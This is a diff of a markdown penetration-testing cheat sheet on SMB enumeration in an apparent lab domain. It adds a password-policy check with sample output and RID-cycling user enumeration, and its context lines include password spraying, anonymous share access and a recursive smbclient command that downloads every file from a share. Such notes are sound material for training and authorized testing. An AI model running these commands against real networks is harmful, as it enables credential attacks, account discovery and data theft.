@@ -41,7 +41,7 @@ netexec smb 172.16.8.139 -u Guest -p '' --shares
 ```
 {% endcode %}
 
-### Enumerate Hosts with SMB Signing Not Required
+### SMB Signing Not Required
 
 Maps the network of live hosts and saves a list of only the hosts that don't require SMB signing. List format is one IP per line.
 
@@ -102,13 +102,39 @@ netexec smb 172.16.8.140 -u 'Administrator' -p 'Password123' --disk --local-auth
 ```
 {% endcode %}
 
+### Password Policy Check
+
 Check password policy on Domain/Workstation
 
 {% code overflow="wrap" %}
 ```bash
-netexec smb 10.4.19.75 -u 'administrator' -p 'passw0rd' --pass-pol
+netexec smb 172.16.8.139 -u 'administrator' -p 'passw0rd' --pass-pol
 ```
 {% endcode %}
+
+Example output:
+
+```bash
+....................
+SMB         172.16.8.139    445    EVANGELION-PC    [+] Dumping password info for domain: EVANGELION
+SMB         172.16.8.139    445    EVANGELION-PC    Minimum password length: 7
+SMB         172.16.8.139    445    EVANGELION-PC    Password history length: 24
+SMB         172.16.8.139    445    EVANGELION-PC    Maximum password age: 41 days 23 hours 53 minutes 
+SMB         172.16.8.139    445    EVANGELION-PC    
+SMB         172.16.8.139    445    EVANGELION-PC    Password Complexity Flags: 000000
+SMB         172.16.8.139    445    EVANGELION-PC        Domain Refuse Password Change: 0
+SMB         172.16.8.139    445    EVANGELION-PC        Domain Password Store Cleartext: 0
+SMB         172.16.8.139    445    EVANGELION-PC        Domain Password Lockout Admins: 0
+SMB         172.16.8.139    445    EVANGELION-PC        Domain Password No Clear Change: 0
+SMB         172.16.8.139    445    EVANGELION-PC        Domain Password No Anon Change: 0
+SMB         172.16.8.139    445    EVANGELION-PC        Domain Password Complex: 0
+SMB         172.16.8.139    445    EVANGELION-PC    
+SMB         172.16.8.139    445    EVANGELION-PC    Minimum password age: 1 day 4 minutes 
+SMB         172.16.8.139    445    EVANGELION-PC    Reset Account Lockout Counter: 30 minutes 
+SMB         172.16.8.139    445    EVANGELION-PC    Locked Account Duration: 30 minutes 
+SMB         172.16.8.139    445    EVANGELION-PC    Account Lockout Threshold: None
+SMB         172.16.8.139    445    EVANGELION-PC    Forced Log off Time: Not Set
+```
 
 ### Password Spraying
 
@@ -122,15 +148,12 @@ netexec smb 172.16.8.139 -u username-lists.txt -p 'p@ssw0rd'
 
 {% code overflow="wrap" %}
 ```bash
-# RID Cycling with Guest 
-netexec smb 172.16.8.139 -u guest -p '' --rid-brute
-
-# RID Cycling with valid account
+# NetExec
 netexec smb 172.16.8.139 -u evasvc -p 'Serviceworks1' --rid-brute
 
-# or with impacket-lookupsid
+# Impacket-lookupsid
 impacket-lookupsid 'evasvc':'Serviceworks1'@evangelion.lab
-
+impacket-lookupsid 'evasvc':'Serviceworks1'@evangelion.lab | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2
 ```
 {% endcode %}
 
@@ -139,10 +162,8 @@ impacket-lookupsid 'evasvc':'Serviceworks1'@evangelion.lab
 ```bash
 # no pass
 smbclient //192.168.1.2/public --no-pass
-
 # with creds
 smbclient //172.16.8.139/secrets-folder -U  'username'%'p@ssw0rd' -p 445
-
 # download all files from shares
 smbclient '//10.10.11.174/support-tools' -N -c 'prompt OFF;recurse ON;mget *'
 ```
